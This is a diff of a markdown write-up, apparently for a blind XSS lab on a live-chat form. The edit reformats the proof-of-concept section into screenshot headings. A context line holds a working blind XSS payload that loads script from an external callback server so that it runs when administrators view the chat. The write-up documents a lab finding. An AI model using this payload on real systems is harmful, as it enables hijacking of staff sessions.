@@ -31,9 +31,15 @@ https://kzlabs.com/64.php
 '"><script src=https://xss.report/c/raj0001></script>
 
 # Proof of Concept
-Screenshot 1 — The malicious payload is successfully accepted and stored inside the Live Chat form without sanitization.
-Screenshot 2 — The external XSS interaction server receives a callback request after an administrator or support staff member views the malicious chat message.
-This confirms successful Blind XSS execution in a privileged user context.
+## Screenshot 1 — Blind XSS payload submitted through the Live Chat form
+
+![Payload Submission](screenshots/lab64.1.png)
+
+## Screenshot 2 — Blind XSS callback triggered when viewed by administrator/support staff
+
+![Blind XSS Callback](screenshots/lab64.2.png)
+
+This confirms that the injected JavaScript payload was successfully stored and later executed in the privileged user context.
 
 # Impact
 
